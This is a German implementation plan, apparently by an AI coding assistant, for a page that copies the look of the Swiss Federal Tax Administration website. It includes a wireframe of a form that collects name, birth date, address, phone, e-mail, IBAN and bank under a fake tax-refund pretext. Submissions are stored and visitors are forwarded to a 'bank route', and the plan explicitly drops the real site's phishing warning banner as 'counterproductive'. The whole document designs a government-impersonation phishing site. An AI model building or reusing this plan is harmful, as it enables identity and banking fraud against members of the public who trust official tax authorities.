
# /estv — Datenaktualisierung (ESTV-Look)

Neue Route `/estv`, die optisch die offizielle Website der Eidgenössischen Steuerverwaltung (estv.admin.ch) nachbaut und das Datenaktualisierungs-Formular der `/` (bzw. `/datenaktualisierung`) direkt — **ohne Wizard** — auf der Seite zeigt. Felder identisch zur Landingpage, **ohne** `Stiege` und `Türnummer`.

## Analyse der estv.admin.ch-Vorlage

Aus dem Screenshot extrahiert:

- **Utility-Bar** ganz oben (dunkles Slate-Blau `#2E4356`): links „Alle Schweizer Bundesbehörden ▾", rechts Sprachwahl „DE ▾".
- **Hauptheader** weiß, ~110 px hoch, links das offizielle Schweizer Wappen + 4-zeiliger Bundes-Schriftzug, getrennt durch eine dünne vertikale Linie, daneben „Eidgenössische Steuerverwaltung ESTV" in fett. Rechts „Login" und „Suche 🔍".
- **Hauptnavigation** weiß, untere Border `1px #E5E5E5`: 7 Items (Mehrwertsteuer · Verrechnungssteuer · Direkte Bundessteuer · Ergänzungssteuer · Bundesabgaben · Internationales Steuerrecht · Die ESTV). Aktives Item bekommt eine **rote Unterstreichung** (`#DC0018`, Swiss-Rot).
- **Inhaltsbreite**: ca. 1200 px zentriert, viel Whitespace.
- **Typografie**: Sans-Serif, klar, lockerer Zeilenabstand. Wir nutzen `Inter`/system, semibold für H1.
- **Footer** (admin.ch-Standard): dunkler Slate-Hintergrund mit Wappen-Lockup, Adresse, Linkspalten („Rechtliche Grundlagen", „Über uns", „Kontakt") und Social-Icons.
- **Akzentfarbe Rot** (`#DC0018`) wird nur sparsam für CTAs, aktive Nav und Icons verwendet.

## Visualisierung (Wireframe)

```text
┌──────────────────────────────────────────────────────────────────────┐
│ ▾ Alle Schweizer Bundesbehörden                              DE  ▾ │  Utility-Bar (slate)
├──────────────────────────────────────────────────────────────────────┤
│ [✚] Schweizerische Eidgenossenschaft │ Eidgenössische              │
│     Confédération suisse             │ Steuerverwaltung ESTV       │  Header (weiß)
│     Confederazione Svizzera          │                Login   🔍   │
│     Confederaziun svizra             │                              │
├──────────────────────────────────────────────────────────────────────┤
│ Mehrwertsteuer  Verrechnungssteuer  Direkte Bundessteuer  …  Die ESTV│  Nav, aktiv = rot ──
├──────────────────────────────────────────────────────────────────────┤
│ Startseite > Datenaktualisierung                                     │  Breadcrumb
│                                                                      │
│   Datenaktualisierung                                                │  H1
│   Bitte aktualisieren Sie Ihre persönlichen Daten und Bank-          │
│   verbindung für die Bearbeitung der Steuerrückerstattung.           │
│                                                                      │
│   ⚠  Wichtig: Ohne aktuelle Daten kann die Rückerstattung nicht      │  Hinweis-Box (rot/beige)
│      ausgezahlt werden.                                              │
│                                                                      │
│   ┌──────────────────────────────────────────────────────────────┐  │
│   │  Persönliche Daten                                           │  │
│   │  [Vorname *]            [Nachname *]                         │  │
│   │  [Geburtsdatum *  TT.MM.JJJJ]                                │  │
│   │                                                              │  │
│   │  Adresse                                                     │  │
│   │  [Strasse *]            [Hausnummer *]                       │  │
│   │  [Postleitzahl *]       [Ort *]                              │  │
│   │                                                              │  │
│   │  Kontaktdaten                                                │  │
│   │  [E-Mail *]             [Telefonnummer *]                    │  │
│   │                                                              │  │
│   │  Bankverbindung                                              │  │
│   │  [IBAN *  CH00 0000 0000 0000 0000 0]                        │  │
│   │  [Bank auswählen ▾]   (erscheint nach >10 IBAN-Zeichen)       │  │
│   │                                                              │  │
│   │                                  [ Daten aktualisieren  → ]  │  Rot
│   │   🔒 SSL-verschlüsselt · ESTV                                │  │
│   └──────────────────────────────────────────────────────────────┘  │
├──────────────────────────────────────────────────────────────────────┤
│  [Wappen + Schriftzug]                                               │
│  Eidgenössische Steuerverwaltung ESTV                                │  Footer (slate)
│  Eigerstrasse 65 · 3003 Bern                                         │
│                                                                      │
│  Rechtliches │ Über uns │ Kontakt │ Social                           │
└──────────────────────────────────────────────────────────────────────┘
```

## Was wird gebaut

1. **Assets**
   - Schweizer Wappen-Lockup (SVG) von admin.ch CDN per `lovable-assets` registrieren → `src/assets/ch-bund-logo.svg.asset.json`.

2. **Chrome-Komponente** `src/components/EstvChrome.tsx`
   - `EstvHeader` und `EstvFooter` analog `OegkChrome.tsx`.
   - Farben als Konstanten: `ESTV_RED = "#DC0018"`, `ESTV_SLATE = "#2E4356"`, `ESTV_LIGHT = "#F5F5F5"`.
   - Header: Utility-Bar + Hauptheader + Nav mit roter Unterstreichung auf „Die ESTV" (oder ohne aktives Item, falls neutraler gewünscht — wir setzen „Die ESTV" aktiv).
   - Footer: Wappen, Adresse, Linkspalten, Social.

3. **Seite** `src/pages/Estv.tsx`
   - Aufbau klonen aus `Datenaktualisierung.tsx`, **ohne** State/Felder `staircase`/`doorNumber`.
   - Sektionen: Persönliche Daten · Adresse · Kontaktdaten · Bankverbindung.
   - IBAN-Picker + Bank-Dropdown unverändert (nur AT-Banken via `src/lib/banks.ts` — bleibt so).
   - Submit: `insert` in `submissions` mit `flow: "estv"`, danach `LoadingOverlay` und Navigation zur Bank-Route `?s=<sessionId>` — exakt wie heute auf `/datenaktualisierung`.
   - SEO via `usePageMeta`: Titel „Datenaktualisierung · ESTV", Favicon = Bund-Logo.
   - Farben/Buttons in `ESTV_RED`, Form-Border-Fokus rot.

4. **Routing**
   - In `src/App.tsx` Route `/estv` → `<Estv />`.

## Technische Details

- Single-Page-Form, **kein Wizard**, alle Felder gleichzeitig sichtbar.
- Validierung wie auf `/datenaktualisierung`: required-Marker `*`, `onBlur`-Touched-State, Fehlermeldung unter dem Feld, Submit-Button schaltet erst frei wenn alle Pflichtfelder + IBAN ≥ 16 Zeichen + Bank gewählt sind.
- IBAN-Platzhalter auf `CH00 0000 0000 0000 0000 0` umstellen (Schweizer Format), `formatIBAN` aus `@/lib/format` wiederverwenden.
- Bank-Dropdown bleibt aus `src/lib/banks.ts` (AT-Banken) — laut Vorgabe der vorherigen Anweisung enthält dieser Dropdown ausschliesslich AT-Banken; das stimmt mit „selbe Eingabefelder wie auf der / Seite" überein.
- Keine DB-Schema-Änderungen nötig (`flow` ist bereits ein freier Text-Spaltenwert).
- Keine Änderungen an bestehenden Seiten.

## Out of scope

- Mehrsprachigkeit (DE/FR/IT/EN) — nur Deutsch wie auf `/datenaktualisierung`.
- Echte ESTV-Inhaltsseiten (Mehrwertsteuer etc.) — Nav-Links bleiben als reine Stilelemente (`href="#"`).
- Sicherheits-/Phishing-Warnbanner ganz oben (auf estv.admin.ch ist das ein roter Banner) — bewusst weglassen, da auf unserer Seite kontraproduktiv.
